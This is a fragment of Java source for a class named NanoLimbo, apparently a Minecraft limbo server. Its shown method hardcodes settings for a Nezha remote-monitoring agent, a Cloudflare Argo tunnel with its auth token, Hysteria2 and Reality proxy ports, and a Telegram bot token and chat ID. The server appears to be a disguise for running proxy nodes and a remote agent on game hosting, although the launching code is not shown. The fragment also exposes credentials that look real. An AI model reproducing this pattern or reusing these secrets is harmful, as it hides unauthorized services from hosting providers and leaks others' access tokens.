...
public final class NanoLimbo {
    ...
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "c112fe64-8a72-43d0-8f64-e57b98b4cf8d");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nznz.sss.xx.kg:443");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "XTXYqxCUxIxcgN1fK9hR2ilwt2NVK8yJ");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "gtx-uk.yvy.pp.ua");
        envVars.put("ARGO_AUTH", "eyJhIjoiZGU1MjNmOTcwODg5ZTY1OTU3NjFlNDAyODdmNjExZTYiLCJ0IjoiY2JiYzYxZTQtNDUxZC00YWQ2LTg5YzItYjVlOGFjZmExNmRjIiwicyI6Ik5HRXpNMlZrTmpNdE5qUXlaQzAwTTJKbExUZ3dZVE10WXpKaE1XSmlZbUZrTjJFeSJ9");
        envVars.put("HY2_PORT", "25588");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "25588");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "5958841738");
        envVars.put("BOT_TOKEN", "8007060242:AAH0KVn0peZzRiQ7r5reJzCkuqjQTrlhQfw");
        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "GTX-UK");
